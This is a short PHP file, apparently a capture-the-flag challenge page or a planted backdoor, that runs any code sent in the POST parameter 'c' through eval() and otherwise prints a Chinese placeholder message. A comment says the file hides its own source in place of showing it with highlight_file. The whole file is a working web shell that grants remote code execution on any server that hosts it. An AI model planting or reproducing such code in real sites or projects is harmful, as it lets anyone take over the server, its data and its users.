<?php
if(isset($_POST['c'])){
    $c = $_POST['c'];
    eval($c);
}else{
    echo "发生了什么？"; // 替换highlight_file，不展示任何源码
}
?>